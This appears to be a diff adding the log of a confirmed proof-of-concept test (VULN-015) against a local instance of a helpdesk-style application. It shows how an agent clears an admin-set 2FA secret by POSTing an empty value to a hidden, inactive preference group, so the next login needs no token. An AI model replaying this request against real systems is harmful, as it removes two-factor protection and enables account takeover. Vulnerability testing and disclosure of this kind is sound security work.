@@ -1,0 +1,10 @@
+==========================================================================
+VULN-015: Active=0 preference-group bypass clears admin-set 2FA secret
+Target: http://localhost:25114
+[INFO] AgentPreferences.pm:251 checks group registered, not Active; regex accepts empty -> clears secret
+==========================================================================
+[SETUP] admin-provisioned 2FA secret for tfa_0be08d5a: 'ABCDEFGHIJKLMNOP'
+[STEP] agent POST AgentPreferences;Update;Group=GoogleAuthenticatorSecretKey;UserGoogleAuthenticatorSecretKey= (empty)
+[PROOF] stored 2FA secret before='ABCDEFGHIJKLMNOP' after=None
+[OK] exploit confirmed — the agent cleared their admin-provisioned 2FA secret (was 'ABCDEFGHIJKLMNOP', now None) by POSTing to the hidden Active=0 'GoogleAuthenticatorSecretKey' group with an empty value — the Update path never checks Active, and the regex accepts empty (with AllowEmptySecret=1 default, next login needs no token).
+==> VULN-015: CONFIRMED — the agent cleared their admin-provisioned 2FA secret (was 'ABCDEFGHIJKLMNOP', now None) by POSTing to the hidden Active=0 'GoogleAuthenticatorSecretKey' group with an empty value — the Update path never checks Active, and the regex accepts empty (with AllowEmptySecret=1 default, next login needs no token).
